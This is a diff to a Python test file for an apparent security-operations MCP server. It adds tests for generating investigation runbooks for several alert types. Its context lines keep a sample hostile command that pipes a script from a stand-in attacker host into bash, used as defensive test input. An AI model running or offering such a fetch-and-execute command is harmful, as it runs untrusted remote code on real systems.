@@ -16,6 +16,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 from soc_mcp_server import (  # noqa: E402
     generate_detection_package,
+    generate_investigation_runbook,
     generate_qradar_aql_detection,
     investigate_command_execution,
     investigate_ssh_alert,
@@ -24,6 +25,21 @@ from soc_mcp_server import (  # noqa: E402
 
 WAZUH_ALERT_PATH = "sample_data/wazuh_alert.json"
 SAMPLE_COMMAND = "curl http://evil.com/payload.sh | bash"
+
+RUNBOOK_REQUIRED_KEYS = [
+    "status",
+    "runbook_title",
+    "alert_type",
+    "purpose",
+    "required_inputs",
+    "investigation_steps",
+    "escalation_criteria",
+    "containment_considerations",
+    "detection_engineering_opportunities",
+    "recommended_mcp_tools",
+    "ticket_documentation_guidance",
+    "analyst_note",
+]
 
 
 def test_parse_wazuh_alert_returns_status_ok() -> None:
@@ -48,6 +64,7 @@ def test_investigate_ssh_alert_includes_required_sections() -> None:
         "recommended_queries",
         "next_action",
         "detection_recommendations",
+        "investigation_runbook",
     ]
 
     for key in required_keys:
@@ -59,6 +76,90 @@ def test_investigate_ssh_alert_includes_required_sections() -> None:
     assert "wazuh_opensearch" in result["recommended_queries"]
     assert "recommended_action" in result["next_action"]
     assert result["detection_recommendations"]["status"] == "ok"
+    assert result["investigation_runbook"]["status"] == "ok"
+    assert result["investigation_runbook"]["alert_type"] == "ssh_auth_failure"
+
+
+def test_generate_investigation_runbook_ssh() -> None:
+    """generate_investigation_runbook should return SSH runbook with required keys."""
+    result_raw = generate_investigation_runbook(
+        alert_type="ssh_auth_failure",
+        severity="medium",
+        confidence_score=60,
+    )
+    result = json.loads(result_raw)
+
+    for key in RUNBOOK_REQUIRED_KEYS:
+        assert key in result, f"Missing key: {key}"
+
+    assert result["status"] == "ok"
+    assert result["alert_type"] == "ssh_auth_failure"
+    steps_text = " ".join(result["investigation_steps"]).lower()
+    assert "brute-force" in steps_text or "brute force" in steps_text
+    assert "success-after-failure" in steps_text or "successful login after" in steps_text
+
+
+def test_generate_investigation_runbook_command() -> None:
+    """generate_investigation_runbook should return command execution runbook."""
+    result_raw = generate_investigation_runbook(
+        alert_type="suspicious_command_execution",
+        severity="high",
+        confidence_score=85,
+    )
+    result = json.loads(result_raw)
+
+    assert result["status"] == "ok"
+    assert result["alert_type"] == "suspicious_command_execution"
+    steps_text = " ".join(result["investigation_steps"]).lower()
+    assert "mitre" in steps_text
+    assert "powershell" in steps_text
+    assert "certutil" in steps_text
+
+
+def test_generate_investigation_runbook_linux_auth() -> None:
+    """generate_investigation_runbook should return linux auth activity runbook."""
+    result_raw = generate_investigation_runbook(
+        alert_type="linux_auth_activity",
+        severity="medium",
+        confidence_score=55,
+    )
+    result = json.loads(result_raw)
+
+    assert result["status"] == "ok"
+    assert result["alert_type"] == "linux_auth_activity"
+    steps_text = " ".join(result["investigation_steps"]).lower()
+    assert "failed login" in steps_text
+    assert "publickey" in steps_text
+
+
+def test_generate_investigation_runbook_unknown() -> None:
+    """generate_investigation_runbook should return generic runbook for unknown types."""
+    result_raw = generate_investigation_runbook(
+        alert_type="unknown",
+        severity="low",
+        confidence_score=30,
+    )
+    result = json.loads(result_raw)
+
+    assert result["status"] == "ok"
+    assert result["alert_type"] == "unknown"
+    steps_text = " ".join(result["investigation_steps"]).lower()
+    assert "observable" in steps_text
+    assert "enrichment" in steps_text or "enrich" in steps_text
+
+
+def test_generate_investigation_runbook_unrecognized_type() -> None:
+    """Unrecognized alert types should fall back to the unknown runbook."""
+    result_raw = generate_investigation_runbook(
+        alert_type="malware_alert",
+        severity="medium",
+        confidence_score=50,
+    )
+    result = json.loads(result_raw)
+
+    assert result["status"] == "ok"
+    assert result["alert_type"] == "unknown"
+    assert "not recognized" in result["analyst_note"].lower()
 
 
 def test_investigate_command_execution_includes_detection_recommendations() -> None:
@@ -148,6 +249,21 @@ def main() -> None:
 
     test_investigate_ssh_alert_includes_required_sections()
     print("PASS: investigate_ssh_alert includes required sections")
+
+    test_generate_investigation_runbook_ssh()
+    print("PASS: generate_investigation_runbook ssh_auth_failure")
+
+    test_generate_investigation_runbook_command()
+    print("PASS: generate_investigation_runbook suspicious_command_execution")
+
+    test_generate_investigation_runbook_linux_auth()
+    print("PASS: generate_investigation_runbook linux_auth_activity")
+
+    test_generate_investigation_runbook_unknown()
+    print("PASS: generate_investigation_runbook unknown")
+
+    test_generate_investigation_runbook_unrecognized_type()
+    print("PASS: generate_investigation_runbook unrecognized type fallback")
 
     test_investigate_command_execution_includes_detection_recommendations()
     print("PASS: investigate_command_execution includes detection_recommendations")
